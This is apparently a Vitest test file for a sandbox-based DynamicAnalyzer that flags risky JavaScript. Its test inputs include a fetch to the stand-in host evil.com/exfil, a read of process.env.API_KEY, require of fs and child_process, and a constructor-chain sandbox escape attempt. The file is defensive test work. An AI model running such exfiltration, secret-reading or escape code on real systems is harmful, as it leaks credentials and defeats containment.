import { describe, it, expect } from 'vitest';
import { DynamicAnalyzer } from '../DynamicAnalyzer.js';

const analyzer = new DynamicAnalyzer();
const defaultConfig = {
  timeout: 3000,
  memoryLimit: 50 * 1024 * 1024,
  networkAccess: false,
  fileSystemAccess: false,
};

describe('DynamicAnalyzer', () => {
  it('should mark safe code as safe', async () => {
    const result = await analyzer.execute(
      `
        const x = 1 + 2;
        const arr = [1, 2, 3].map(n => n * 2);
      `,
      defaultConfig,
    );
    expect(result.safe).toBe(true);
    expect(result.networkAttempts).toHaveLength(0);
    expect(result.fsAttempts).toHaveLength(0);
  });

  it('should detect network access via fetch', async () => {
    const result = await analyzer.execute(
      `
        fetch('https://evil.com/exfil');
      `,
      defaultConfig,
    );
    expect(result.safe).toBe(false);
    expect(result.networkAttempts).toContain('https://evil.com/exfil');
  });

  it('should detect fs access via require', async () => {
    const result = await analyzer.execute(
      `
        const fs = require('fs');
      `,
      defaultConfig,
    );
    expect(result.safe).toBe(false);
    expect(result.fsAttempts.length).toBeGreaterThan(0);
  });

  it('should detect process.env access', async () => {
    const result = await analyzer.execute(
      `
        const key = process.env.API_KEY;
      `,
      defaultConfig,
    );
    expect(result.safe).toBe(false);
    expect(result.suspiciousBehavior.some((b) => b.includes('process.env'))).toBe(true);
  });

  it('should detect child_process require', async () => {
    const result = await analyzer.execute(
      `
        try {
          const cp = require('child_process');
        } catch(e) {}
      `,
      defaultConfig,
    );
    expect(result.safe).toBe(false);
    expect(result.suspiciousBehavior.some((b) => b.includes('child_process'))).toBe(true);
  });

  it('should detect setInterval usage', async () => {
    const result = await analyzer.execute(
      `
        setInterval(() => {}, 1000);
      `,
      defaultConfig,
    );
    expect(result.safe).toBe(false);
    expect(result.suspiciousBehavior.some((b) => b.includes('setInterval'))).toBe(true);
  });

  it('should handle timeout for infinite loops', async () => {
    const result = await analyzer.execute(`while(true) {}`, { ...defaultConfig, timeout: 500 });
    expect(result.suspiciousBehavior.some((b) => b.includes('timed out'))).toBe(true);
  });

  it('should handle code that throws errors', async () => {
    const result = await analyzer.execute(`throw new Error('test error');`, defaultConfig);
    // Throwing an error is not inherently suspicious
    expect(result.networkAttempts).toHaveLength(0);
    expect(result.fsAttempts).toHaveLength(0);
  });

  it('should block constructor chain escape via this (strict mode)', async () => {
    // In strict mode IIFE wrapper, `this` is undefined, so this.constructor throws
    const result = await analyzer.execute(
      `this.constructor.constructor("return process")();`,
      defaultConfig,
    );
    expect(result).toBeDefined();
    // Code throws before escape; no host leak
    expect(result.networkAttempts).toHaveLength(0);
    expect(result.fsAttempts).toHaveLength(0);
  });

  it('should flag Buffer allocation over 1MB', async () => {
    const result = await analyzer.execute(
      `Buffer.alloc(2 * 1024 * 1024);`,
      defaultConfig,
    );
    expect(result.suspiciousBehavior.some((b) => b.includes('Buffer') && b.includes('exceeds'))).toBe(
      true,
    );
    expect(result.safe).toBe(false);
  });

  it('should allow Buffer allocation under 1MB', async () => {
    const result = await analyzer.execute(
      `const b = Buffer.alloc(100);`,
      defaultConfig,
    );
    expect(result.safe).toBe(true);
    expect(result.suspiciousBehavior.filter((b) => b.includes('Buffer'))).toHaveLength(0);
  });

  it('should flag Buffer.from result over 1MB', async () => {
    const result = await analyzer.execute(
      `Buffer.from(new Array(2 * 1024 * 1024).fill(0));`,
      defaultConfig,
    );
    expect(result.suspiciousBehavior.some((b) => b.includes('Buffer.from'))).toBe(true);
    expect(result.safe).toBe(false);
  });

  it('should not expose Promise in sandbox', async () => {
    const result = await analyzer.execute(
      `Promise.resolve(1).then(x => x);`,
      defaultConfig,
    );
    // ReferenceError: Promise is not defined, or similar; execution fails without escaping
    expect(result).toBeDefined();
    expect(result.networkAttempts).toHaveLength(0);
  });
});
